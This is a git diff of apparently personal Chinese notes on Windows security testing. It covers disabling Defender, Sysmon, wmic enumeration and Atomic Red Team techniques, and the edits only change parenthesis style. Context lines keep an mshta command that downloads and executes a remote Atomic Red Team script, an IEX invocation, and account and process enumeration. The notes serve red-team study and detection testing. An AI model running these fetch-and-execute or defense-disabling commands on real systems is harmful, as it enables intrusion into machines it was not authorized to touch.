@@ -56,7 +56,7 @@
 
 ## 永久关闭 Windows 实时防护
 
-> [Win11 关闭 Windows Defender 实时保护，暂时关闭和永久关闭方法 | Win10 怎么永久关闭 Windows Defender 实时保护\_COCO56（徐可可）的博客-CSDN 博客](https://blog.csdn.net/COCO56/article/details/128613164)
+> [Win11 关闭 Windows Defender 实时保护，暂时关闭和永久关闭方法 | Win10 怎么永久关闭 Windows Defender 实时保护\_COCO56(徐可可) 的博客-CSDN 博客](https://blog.csdn.net/COCO56/article/details/128613164)
 
 在需要完全关闭 Windows 防病毒设置时一般会选择在 Windows 安全中心进行相关配置
 
@@ -110,13 +110,13 @@
 *Sysmon* 包括以下功能：
 
 - 记录当前进程和父进程中使用完整命令行创建的进程。
-- 记录使用 SHA1（默认）、MD5、SHA256 或 IMPHASH 的进程映像文件的哈希。
+- 记录使用 SHA1(默认) 、MD5、SHA256 或 IMPHASH 的进程映像文件的哈希。
 - 可以同时使用多个哈希。
 - 在进程内创建事件之中包含一个进程 GUID，当 Windows 重新使用进程 ID 时，允许事件的相关性。
 - 在每个事件中包含会话 GUID，允许同一登录会话上事件的相关性。
 - 记录驱动程序或 DLL 的加载及其签名与哈希。
 - 记录磁盘和卷的原始读取访问打开次数。
-- （可选）记录网络连接，包括每个连接的源进程、IP 地址、端口数量、主机名和端口名称。
+- (可选) 记录网络连接，包括每个连接的源进程、IP 地址、端口数量、主机名和端口名称。
 - 检测文件创建时间的更改，以了解文件真正创建的时间。 修改文件创建时间戳是恶意软件惯用的伎俩来掩盖其轨道。
 - 如果注册表中发生更改，则自动化重新加载配置。
 - 进行规则筛选以动态包含或不包含某些事件。
@@ -146,13 +146,13 @@ sysmon64 -i
 打印架构：`sysmon64 -s`
 卸载：`sysmon64 -u [force]`
 
-| 参数   | 说明                                                                                            |
-| :----- | :---------------------------------------------------------------------------------------------- |
-| -i     | 安装服务和驱动程序。 （可选）采用配置文件。                                                     |
-| **-c** | 如果未提供其他参数，则更新已安装的 Sysmon 驱动程序的配置或转储当前配置。 （可选）采用配置文件。 |
-| **-m** | 安装事件清单（以及在服务安装时隐式完成）。                                                      |
-| **-s** | 打印配置架构定义。                                                                              |
-| **-u** | 卸载服务和驱动程序。 使用“`-u force`”会导致卸载继续进行，即使未安装一些组件。                   |
+| 参数   | 说明                                                                                           |
+| :----- | :--------------------------------------------------------------------------------------------- |
+| -i     | 安装服务和驱动程序。 (可选) 采用配置文件。                                                     |
+| **-c** | 如果未提供其他参数，则更新已安装的 Sysmon 驱动程序的配置或转储当前配置。 (可选) 采用配置文件。 |
+| **-m** | 安装事件清单(以及在服务安装时隐式完成) 。                                                      |
+| **-s** | 打印配置架构定义。                                                                             |
+| **-u** | 卸载服务和驱动程序。 使用“`-u force`”会导致卸载继续进行，即使未安装一些组件。                  |
 
 服务会立即记录事件，驱动程序会安装为引导启动驱动程序，从引导早期开始就捕获活动，服务会将启动时间写入活动日志。
 
@@ -593,7 +593,7 @@ at 命令在 win10 中已经弃用, 在 Win7 中可以使用
 ### 在 CMD 中使用 wmic 命令查看一些系统信息
 
 ```powershell
-# 列出系统中所有用户账户的详细信息，包括用户的各种属性，如用户名、SID（安全标识符）、账户类型等，输出格式设置为 CSV
+# 列出系统中所有用户账户的详细信息，包括用户的各种属性，如用户名、SID(安全标识符) 、账户类型等，输出格式设置为 CSV
 wmic useraccount get /ALL /format:csv
 # 列出系统中所有进程的名称、它们的可执行文件路径和启动它们的命令行参数，输出格式为 CSV
 wmic process get caption,executablepath,commandline /format:csv
@@ -603,7 +603,7 @@ wmic qfe get description,installedOn /format:csv
 
 - `xxx get`: 获取 xxx 信息
   - `useraccount`：获取用户账户信息。
-  - `process`：获取与进程（程序）相关的信息。
+  - `process`：获取与进程(程序) 相关的信息。
   - `qfe(Quick Fix Engineering)`: 获取系统上的更新和修补程序信息
 - `get xxx` 获取 xxx 信息
   - `caption` 进程的名称
@@ -635,7 +635,7 @@ wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
 
   - `like "%Spooler%"`  筛选出描述中包含“Spooler”字样的服务。
 
-    百分号（`%`）是通配符，表示“Spooler”可以出现在任何位置。
+    百分号(`%`) 是通配符，表示“Spooler”可以出现在任何位置。
 
 >![image-20231121155454706](http://cdn.ayusummer233.top/DailyNotes/202311211554805.png)
 
@@ -733,7 +733,7 @@ Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
 
 - `-ArgumentList notepad.exe`：传递给 `create` 方法的参数，表示要创建的进程。
 
-  在此示例中将启动 Windows 记事本应用程序（Notepad）
+  在此示例中将启动 Windows 记事本应用程序(Notepad) 
 
 ---
 
@@ -764,7 +764,7 @@ try { $CleanupClass.Delete() } catch {}
 
 - 由于 Win32_Atomic 类是从 Win32_Process 类派生的，它继承了 create 方法，该方法用于创建新的进程。
 
-  在这个例子中，它被用来启动 Windows 的记事本应用程序（Notepad）。
+  在这个例子中，它被用来启动 Windows 的记事本应用程序(Notepad) 。
 
   ---
 
@@ -1058,8 +1058,8 @@ $Xml.command.a.execute | IEX
 C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
 ```
 
-- `mshta` 是一个执行 HTML 应用程序（HTA）的工具。  
-  HTA 是由 HTML 和脚本（如 JavaScript 或 VBScript）组成的应用程序，它们在 Windows 上以类似于标准网页的方式运行
+- `mshta` 是一个执行 HTML 应用程序(HTA) 的工具。  
+  HTA 是由 HTML 和脚本(如 JavaScript 或 VBScript) 组成的应用程序，它们在 Windows 上以类似于标准网页的方式运行
 - `javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()`
   - `javascript:`: 指示 `mshta` 执行 JavaScript 代码
   - `a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();`: 获取 `mshta.sct` 中的命令并执行
@@ -1630,7 +1630,7 @@ Remove-Item "C:\AtomicRedTeam\ExternalPayloads\T1059.003_script.bat" -Force -Err
 >
 > [eXploit – CVE-2021-42287/CVE-2021-42278 Weaponisation --- eXploit – CVE-2021-42287/CVE-2021-42278 武器化](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
 >
-> [CVE-2021-42278&42287（域控）漏洞分析与利用 | KB-AT的博客 (kb-at-zero.github.io)](https://kb-at-zero.github.io/2021/12/19/CVE-2021-42278-42287（域控）漏洞分析与利用/)
+> [CVE-2021-42278&42287(域控) 漏洞分析与利用 | KB-AT的博客 (kb-at-zero.github.io)](https://kb-at-zero.github.io/2021/12/19/CVE-2021-42278-42287(域控) 漏洞分析与利用/)
 
 适用范围: 未打补丁的 Winserver, 具体可参阅上述连接, 似乎 winserver 2012  - 2022 都有覆盖
 
